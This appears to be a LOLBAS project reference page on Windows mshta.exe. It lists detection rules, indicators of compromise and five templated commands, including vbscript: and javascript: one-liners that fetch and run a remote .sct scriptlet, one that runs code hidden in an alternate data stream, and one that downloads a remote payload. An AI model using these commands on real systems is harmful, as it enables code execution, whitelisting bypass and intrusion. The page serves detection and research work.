---
title: "Mshta.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Mshta/
fetched_at: 2026-09-20T17:10:46Z
license: unspecified
category: windows
---

Used by Windows to execute html applications. (.hta)

## Paths
- C:\Windows\System32\mshta.exe
- C:\Windows\SysWOW64\mshta.exe

## Resources
- [https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4](https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4)
- [https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct](https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct)
- [https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/](https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/)
- [https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)

## Acknowledgements
- Casey Smith ([@subtee](https://twitter.com/@subtee))
- Oddvar Moe ([@oddvarmoe](https://twitter.com/@oddvarmoe))
- Nir Chako (Pentera) ([@C_h4ck_0](https://twitter.com/@C_h4ck_0))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_susp_pattern.yml](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_susp_pattern.yml)
- Sigma: [https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_via_use_mhsta.yml](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_via_use_mhsta.yml)
- Sigma: [https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_lethalhta_technique.yml](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_lethalhta_technique.yml)
- Sigma: [https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_javascript.yml](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_mshta_javascript.yml)
- Sigma: [https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/file/file_event/file_event_win_net_cli_artefact.yml](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/file/file_event/file_event_win_net_cli_artefact.yml)
- Sigma: [https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/image_load/image_load_susp_script_dotnet_clr_dll_load.yml](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/image_load/image_load_susp_script_dotnet_clr_dll_load.yml)
- Elastic: [https://github.com/elastic/detection-rules/blob/f8f643041a584621e66cf8e6d534ad3db92edc29/rules/windows/defense_evasion_mshta_beacon.toml](https://github.com/elastic/detection-rules/blob/f8f643041a584621e66cf8e6d534ad3db92edc29/rules/windows/defense_evasion_mshta_beacon.toml)
- Elastic: [https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/lateral_movement_dcom_hta.toml](https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/lateral_movement_dcom_hta.toml)
- Elastic: [https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml](https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml)
- Splunk: [https://github.com/splunk/security_content/blob/08ed88bd88259c03c771c30170d2934ed0a8f878/stories/suspicious_mshta_activity.yml](https://github.com/splunk/security_content/blob/08ed88bd88259c03c771c30170d2934ed0a8f878/stories/suspicious_mshta_activity.yml)
- Splunk: [https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_mshta_renamed.yml](https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_mshta_renamed.yml)
- Splunk: [https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_mshta_spawn.yml](https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_mshta_spawn.yml)
- Splunk: [https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_mshta_child_process.yml](https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_mshta_child_process.yml)
- Splunk: [https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_mshta_url_in_command_line.yml](https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_mshta_url_in_command_line.yml)
- BlockRule: [https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules)
- IOC: mshta.exe executing raw or obfuscated script within the command-line
- IOC: General usage of HTA file
- IOC: msthta.exe network connection to Internet/WWW resource
- IOC: DotNet CLR libraries loaded into mshta.exe
- IOC: DotNet CLR Usage Log - mshta.exe.log

## Execute

1. Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.

```
mshta.exe {PATH:.hta}
```

   - Use case: Execute code

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1218.005

   - Tags: Execute: HTAExecute: Remote

2. Executes VBScript supplied as a command line argument.

```
mshta.exe vbscript:Close(Execute("GetObject(""script:{REMOTEURL:.sct}"")"))
```

   - Use case: Execute code

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1218.005

   - Tags: Execute: VBScript

3. Executes JavaScript supplied as a command line argument.

```
mshta.exe javascript:a=GetObject("script:{REMOTEURL:.sct}").Exec();close();
```

   - Use case: Execute code

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1218.005

   - Tags: Execute: JScript

4. Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.

```
mshta.exe "{PATH_ABSOLUTE}:file.hta"
```

   - Use case: Execute code hidden in alternate data stream

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10 (Does not work on 1903 and newer)

   - ATT&CK® technique: T1218.005

   - Tags: Execute: HTA

5. It will download a remote payload and place it in INetCache.

```
mshta.exe {REMOTEURL}
```

   - Use case: Downloads payload from remote server

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1105

   - Tags: Download: INetCache
